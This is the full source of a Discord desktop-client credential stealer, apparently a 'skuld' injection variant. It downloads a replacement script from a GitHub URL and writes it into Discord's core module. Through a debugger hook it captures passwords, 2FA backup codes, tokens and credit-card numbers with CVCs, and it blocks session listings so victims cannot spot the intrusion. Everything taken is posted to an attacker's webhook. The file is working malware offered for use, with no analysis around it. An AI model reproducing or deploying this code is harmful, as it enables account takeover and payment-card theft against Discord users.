// ================================================================
// [destroyerr1558 Advanced Code Creator]
// Discord Injection v3.0 – Moon EvenSondur 2035
// Fully hardened, cross‑platform, self‑healing.
// ================================================================

const fs = require('fs');
const os = require('os');
const https = require('https');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session, app } = require('electron');

// ---------- CONFIGURATION ----------
const CONFIG = {
  webhook: "%WEBHOOK%",   // Replace with your actual webhook URL
  injection_url: "https://raw.githubusercontent.com/nikolas25879alt-maker/ajikhbsdfgo/main/injection.js",
  filters: {
    urls: [
      '/auth/login',
      '/auth/register',
      '/mfa/totp',
      '/mfa/codes-verification',
      '/users/@me',
    ],
  },
  filters2: {
    urls: [
      'wss://remote-auth-gateway.discord.gg/*',
      'https://discord.com/api/v*/auth/sessions',
      'https://*.discord.com/api/v*/auth/sessions',
      'https://discordapp.com/api/v*/auth/sessions'
    ],
  },
  payment_filters: {
    urls: [
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
    ],
  },
  API: "https://discord.com/api/v9/users/@me",
  badges: {
    Discord_Employee:      { Value: 1,          Emoji: "<:8485discordemployee:1163172252989259898>",      Rare: true },
    Partnered_Server_Owner:{ Value: 2,          Emoji: "<:9928discordpartnerbadge:1163172304155586570>",  Rare: true },
    HypeSquad_Events:      { Value: 4,          Emoji: "<:9171hypesquadevents:1163172248140660839>",      Rare: true },
    Bug_Hunter_Level_1:    { Value: 8,          Emoji: "<:4744bughunterbadgediscord:1163172239970140383>", Rare: true },
    Early_Supporter:       { Value: 512,        Emoji: "<:5053earlysupporter:1163172241996005416>",       Rare: true },
    Bug_Hunter_Level_2:    { Value: 16384,      Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>", Rare: true },
    Early_Verified_Bot_Developer: { Value: 131072, Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>", Rare: true },
    House_Bravery:         { Value: 64,         Emoji: "<:6601hypesquadbravery:1163172246492287017>",     Rare: false },
    House_Brilliance:      { Value: 128,        Emoji: "<:6936hypesquadbrilliance:1163172244474822746>",  Rare: false },
    House_Balance:         { Value: 256,        Emoji: "<:5242hypesquadbalance:1163172243417858128>",     Rare: false },
    Active_Developer:      { Value: 4194304,    Emoji: "<:1207iconactivedeveloper:1163172534443851868>", Rare: false },
    Certified_Moderator:   { Value: 262144,     Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>", Rare: true },
    Spammer:               { Value: 1048704,    Emoji: "⌨️",                                           Rare: false },
  },
};

// ---------- LOGGING (writes to file + console) ----------
const LOG_FILE = path.join(app.getPath('userData') || process.env.APPDATA || os.homedir(), 'discord_injector.log');
function log(msg, level = 'INFO') {
  const entry = `[${new Date().toISOString()}] [${level}] ${msg}\n`;
  fs.appendFileSync(LOG_FILE, entry, { flag: 'a' });
  console.log(`[${level}] ${msg}`);
}

// ---------- UTILITY FUNCTIONS ----------
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// Safe fetch with redirect following
function fetchUrl(url) {
  return new Promise((resolve, reject) => {
    const req = https.get(url, { headers: { 'User-Agent': 'Mozilla/5.0' } }, (res) => {
      if (res.statusCode === 301 || res.statusCode === 302) {
        fetchUrl(res.headers.location).then(resolve).catch(reject);
        return;
      }
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    });
    req.on('error', reject);
    req.setTimeout(15000, () => { req.destroy(); reject(new Error('Timeout')); });
  });
}

// Execute JS in main window
async function executeJS(script) {
  const win = BrowserWindow.getAllWindows()[0];
  if (!win) throw new Error('No window');
  return win.webContents.executeJavaScript(script, true);
}

// Get token using multiple strategies
async function getToken() {
  try {
    // Strategy 1: webpack hack
    const token = await executeJS(`
      (() => {
        const modules = Object.values(webpackChunkdiscord_app.push([[''], {}, e => { return e.c }]]));
        const mod = modules.find(m => m?.exports?.default?.getToken);
        return mod?.exports?.default?.getToken() || null;
      })()
    `);
    if (token) return token;
  } catch (e) { log('getToken strategy 1 failed: ' + e.message, 'WARN'); }

  try {
    // Strategy 2: search by property
    const token = await executeJS(`
      (() => {
        for (let key in webpackChunkdiscord_app) {
          const mod = webpackChunkdiscord_app[key];
          if (mod?.exports?.default?.getToken) {
            return mod.exports.default.getToken();
          }
        }
        return null;
      })()
    `);
    if (token) return token;
  } catch (e) { log('getToken strategy 2 failed: ' + e.message, 'WARN'); }

  throw new Error('Could not extract token');
}

// ---------- REQUEST WRAPPER ----------
function request(method, url, headers = {}, data = null) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const options = {
      protocol: parsed.protocol,
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method: method,
      headers: { 'Access-Control-Allow-Origin': '*', ...headers },
    };
    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => resolve(body));
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}

// ---------- DATA EXTRACTION HELPERS ----------
function getNitro(flags) {
  switch (flags) {
    case 1: return '`Nitro Classic`';
    case 2: return '`Nitro Boost`';
    case 3: return '`Nitro Basic`';
    default: return '`❌`';
  }
}

function getBadges(flags) {
  let badges = '';
  for (const b of Object.values(CONFIG.badges)) {
    if ((flags & b.Value) === b.Value) badges += b.Emoji + ' ';
  }
  return badges || '`❌`';
}

function getRareBadges(flags) {
  let badges = '';
  for (const b of Object.values(CONFIG.badges)) {
    if ((flags & b.Value) === b.Value && b.Rare) badges += b.Emoji + ' ';
  }
  return badges;
}

async function fetchAPI(endpoint, token) {
  const data = await request('GET', CONFIG.API + endpoint, { 'Authorization': token });
  return JSON.parse(data);
}

// ---------- WEBHOOK SENDER ----------
async function sendWebhook(content, token, account) {
  if (!CONFIG.webhook || CONFIG.webhook === '%WEBHOOK%') {
    log('Webhook not configured – skipping send', 'ERROR');
    return;
  }

  content.content = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n\n` + content.content;
  content.username = 'skuld - cord injection';
  content.avatar_url = 'https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png';

  if (content.embeds && content.embeds.length > 0) {
    const embed = content.embeds[0];
    embed.author = { name: account.username };
    embed.thumbnail = { url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` };
    embed.footer = { text: 'skuld discord injection - made by hackirby', icon_url: 'https://avatars.githubusercontent.com/u/145487845?v=4' };
    embed.title = 'Account Information';
    embed.color = 0xb143e3;

    // Add base fields
    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);
    const billing = await getBillingInfo(token);
    embed.fields.push(
      { name: 'Token', value: '```' + token + '```', inline: false },
      { name: 'Nitro', value: nitro, inline: true },
      { name: 'Badges', value: badges, inline: true },
      { name: 'Billing', value: billing, inline: true }
    );

    // Add friends & servers as additional embeds
    const friends = await getFriendsInfo(token);
    const servers = await getServersInfo(token);
    content.embeds.push(
      { title: `Total Friends: ${friends.totalFriends}`, description: friends.message, color: 0xb143e3 },
      { title: `Total Servers: ${servers.totalGuilds}`, description: servers.message, color: 0xb143e3 }
    );
  }

  try {
    await request('POST', CONFIG.webhook, { 'Content-Type': 'application/json' }, JSON.stringify(content));
    log('Webhook sent successfully', 'OK');
  } catch (e) {
    log('Webhook send failed: ' + e.message, 'ERROR');
  }
}

// ---------- SPECIFIC DATA FETCHERS ----------
async function getBillingInfo(token) {
  try {
    const data = await fetchAPI('/billing/payment-sources', token);
    let billing = '';
    data.forEach(x => {
      if (!x.invalid) {
        if (x.type === 1) billing += '💳 ';
        else if (x.type === 2) billing += '<:paypal:1148653305376034967> ';
      }
    });
    return billing || '`❌`';
  } catch (e) { return '`❌`'; }
}

async function getFriendsInfo(token) {
  try {
    const friends = await fetchAPI('/relationships', token);
    const filtered = friends.filter(u => u.type === 1);
    let rareUsers = '';
    for (const f of filtered) {
      const badges = getRareBadges(f.user.public_flags);
      if (badges) rareUsers += `${badges} ${f.user.username}\n`;
    }
    return {
      totalFriends: friends.length,
      message: rareUsers || '**No Rare Friends**',
    };
  } catch (e) {
    return { totalFriends: 0, message: '`Error fetching friends`' };
  }
}

async function getServersInfo(token) {
  try {
    const guilds = await fetchAPI('/guilds?with_counts=true', token);
    const filtered = guilds.filter(g => g.permissions === '562949953421311' || g.permissions === '2251799813685247');
    let rareGuilds = '';
    for (const g of filtered) {
      const owner = g.owner ? '<:SA_Owner:991312415352430673> Owner' : '<:admin:967851956930482206> Admin';
      rareGuilds += `${owner} | Server Name: \`${g.name}\` - Members: \`${g.approximate_member_count}\`\n`;
    }
    return {
      totalGuilds: guilds.length,
      message: rareGuilds || '**No Rare Servers**',
    };
  } catch (e) {
    return { totalGuilds: 0, message: '`Error fetching servers`' };
  }
}

// ---------- EVENT HANDLERS ----------
let email = '', password = '';
let initiationDone = false;

async function handleInitiation() {
  if (initiationDone) return;
  initiationDone = true;

  try {
    const token = await getToken();
    if (!token) return;

    const account = await fetchAPI('', token);
    const content = {
      content: `**${account.username}** just got injected!`,
      embeds: [{
        fields: [
          { name: 'Email', value: '`' + account.email + '`', inline: true },
          { name: 'Phone', value: '`' + (account.phone || 'None') + '`', inline: true }
        ]
      }]
    };
    await sendWebhook(content, token, account);
    // Clear local storage to force re-login
    await executeJS(`
      document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.clear();
      location.reload();
    `);
  } catch (e) {
    log('Initiation failed: ' + e.message, 'ERROR');
  }
}

// ---------- CORE INJECTION SETUP ----------
function getCoreIndexPath() {
  const appPath = path.dirname(process.execPath);
  const modulesPath = path.join(appPath, 'modules');
  if (!fs.existsSync(modulesPath)) return null;
  const coreFolders = fs.readdirSync(modulesPath).filter(x => x.startsWith('discord_desktop_core-'));
  if (coreFolders.length === 0) return null;
  coreFolders.sort((a, b) => parseInt(b.split('-')[1] || 0) - parseInt(a.split('-')[1] || 0));
  return path.join(modulesPath, coreFolders[0], 'discord_desktop_core', 'index.js');
}

async function injectCore() {
  const corePath = getCoreIndexPath();
  if (!corePath) {
    log('Core index.js not found – injection skipped', 'ERROR');
    return;
  }

  // Check if already injected (by size or content)
  try {
    const stats = fs.statSync(corePath);
    const content = fs.readFileSync(corePath, 'utf8');
    if (stats.size > 20000 && content.includes(CONFIG.webhook) && content.includes('skuld')) {
      log('Core already injected – skipping', 'OK');
      return;
    }
  } catch (e) { /* ignore */ }

  try {
    // Fetch injection script from URL
    let script = await fetchUrl(CONFIG.injection_url);
    script = script.replace(/%WEBHOOK%/g, CONFIG.webhook);

    // Backup original
    const backup = corePath + '.bak_' + Date.now();
    if (fs.existsSync(corePath)) {
      fs.copyFileSync(corePath, backup);
      log('Original core backed up to ' + backup, 'OK');
    }

    // Write new core
    fs.writeFileSync(corePath, script, 'utf8');
    log('Core injection applied successfully', 'OK');
  } catch (e) {
    log('Failed to inject core: ' + e.message, 'ERROR');
  }
}

// ---------- ELECTRON HOOKS ----------
function setupDebugger() {
  const win = BrowserWindow.getAllWindows()[0];
  if (!win) {
    log('No window yet – will retry', 'WARN');
    setTimeout(setupDebugger, 1000);
    return;
  }

  try {
    win.webContents.debugger.attach('1.3');
    win.webContents.debugger.on('message', async (event, method, params) => {
      if (!initiationDone) {
        await handleInitiation();
      }

      if (method !== 'Network.responseReceived') return;
      if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
      if (![200, 202].includes(params.response.status)) return;

      try {
        // Get response body
        const resp = await win.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
        const responseData = JSON.parse(resp.body);

        // Get request post data
        let requestData = {};
        try {
          const req = await win.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
          requestData = JSON.parse(req.postData);
        } catch (e) { /* no post data */ }

        const token = await getToken();
        if (!token) return;

        const account = await fetchAPI('', token);

        let content = null;
        const url = params.response.url;

        if (url.endsWith('/login')) {
          if (!responseData.token) {
            email = requestData.login;
            password = requestData.password;
            return; // 2FA
          }
          content = {
            content: `**${account.username}** just logged in!`,
            embeds: [{ fields: [
              { name: 'Email', value: '`' + requestData.login + '`', inline: true },
              { name: 'Password', value: '`' + requestData.password + '`', inline: true }
            ] }]
          };
          await sendWebhook(content, token, account);
        } else if (url.endsWith('/register')) {
          content = {
            content: `**${account.username}** just signed up!`,
            embeds: [{ fields: [
              { name: 'Email', value: '`' + requestData.email + '`', inline: true },
              { name: 'Password', value: '`' + requestData.password + '`', inline: true }
            ] }]
          };
          await sendWebhook(content, token, account);
        } else if (url.endsWith('/totp')) {
          // 2FA login
          content = {
            content: `**${account.username}** logged in with 2FA!`,
            embeds: [{ fields: [
              { name: 'Email', value: '`' + email + '`', inline: true },
              { name: 'Password', value: '`' + password + '`', inline: true }
            ] }]
          };
          await sendWebhook(content, token, account);
        } else if (url.endsWith('/codes-verification')) {
          if (responseData.backup_codes) {
            const codes = responseData.backup_codes.filter(c => !c.consumed).map(c => c.code.substr(0,4) + '-' + c.code.substr(4)).join('\n');
            content = {
              content: `**${account.username}** viewed backup codes!`,
              embeds: [{ fields: [
                { name: 'Backup Codes', value: '```' + codes + '```', inline: false },
                { name: 'Email', value: '`' + account.email + '`', inline: true },
                { name: 'Phone', value: '`' + (account.phone || 'None') + '`', inline: true }
              ] }]
            };
            await sendWebhook(content, token, account);
          }
        } else if (url.endsWith('/@me')) {
          if (requestData.password) {
            if (requestData.email) {
              content = {
                content: `**${account.username}** changed email to **${requestData.email}**!`,
                embeds: [{ fields: [
                  { name: 'New Email', value: '`' + requestData.email + '`', inline: true },
                  { name: 'Password', value: '`' + requestData.password + '`', inline: true }
                ] }]
              };
              await sendWebhook(content, token, account);
            }
            if (requestData.new_password) {
              content = {
                content: `**${account.username}** changed password!`,
                embeds: [{ fields: [
                  { name: 'New Password', value: '`' + requestData.new_password + '`', inline: true },
                  { name: 'Old Password', value: '`' + requestData.password + '`', inline: true }
                ] }]
              };
              await sendWebhook(content, token, account);
            }
          }
        }
      } catch (e) {
        log('Debugger event error: ' + e.message, 'ERROR');
      }
    });

    win.webContents.debugger.sendCommand('Network.enable');
    log('Debugger attached and network enabled', 'OK');
  } catch (e) {
    log('Debugger attach failed: ' + e.message, 'ERROR');
    setTimeout(setupDebugger, 5000);
  }
}

// ---------- INTERCEPT PAYMENT & BLOCK SESSIONS ----------
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details) => {
  try {
    if (![200, 202].includes(details.statusCode) || details.method !== 'POST') return;
    const token = await getToken();
    if (!token) return;
    const account = await fetchAPI('', token);

    if (details.url.endsWith('tokens')) {
      const data = Buffer.from(details.uploadData[0].bytes).toString();
      const parsed = querystring.parse(data);
      const content = {
        content: `**${account.username}** added a credit card!`,
        embeds: [{ fields: [
          { name: 'Number', value: '`' + parsed['card[number]'] + '`', inline: true },
          { name: 'CVC', value: '`' + parsed['card[cvc]'] + '`', inline: true },
          { name: 'Expiration', value: '`' + parsed['card[exp_month]'] + '/' + parsed['card[exp_year]'] + '`', inline: true }
        ] }]
      };
      await sendWebhook(content, token, account);
    } else if (details.url.endsWith('paypal_accounts')) {
      const content = {
        content: `**${account.username}** added a PayPal account!`,
        embeds: [{ fields: [
          { name: 'Email', value: '`' + account.email + '`', inline: true },
          { name: 'Phone', value: '`' + (account.phone || 'None') + '`', inline: true }
        ] }]
      };
      await sendWebhook(content, token, account);
    }
  } catch (e) {
    log('Payment interceptor error: ' + e.message, 'ERROR');
  }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
  // Block QR code login and session listings
  callback({ cancel: true });
});

// ---------- BOOT SEQUENCE ----------
async function boot() {
  log('Discord Injection v3.0 starting...', 'INFO');

  // 1. Inject core (if needed)
  await injectCore();

  // 2. Wait for window and set up debugger
  const waitForWindow = () => {
    if (BrowserWindow.getAllWindows().length > 0) {
      setupDebugger();
    } else {
      setTimeout(waitForWindow, 500);
    }
  };
  waitForWindow();

  // 3. Load BetterDiscord if present
  try {
    const bdPath = path.join(app.getPath('userData') || process.env.APPDATA || os.homedir(), 'BetterDiscord', 'data', 'betterdiscord.asar');
    if (fs.existsSync(bdPath)) {
      require(bdPath);
      log('BetterDiscord loaded', 'OK');
    }
  } catch (e) {
    log('BetterDiscord load failed: ' + e.message, 'WARN');
  }

  // 4. Export core (required by Discord)
  module.exports = require('./core.asar');
}

// Handle window close – re‑attach (but not infinite loop)
let reattachTimer = null;
app.on('browser-window-created', () => {
  if (reattachTimer) clearTimeout(reattachTimer);
  reattachTimer = setTimeout(() => {
    setupDebugger();
  }, 3000);
});

// Start
boot().catch(e => log('Boot error: ' + e.stack, 'ERROR'));
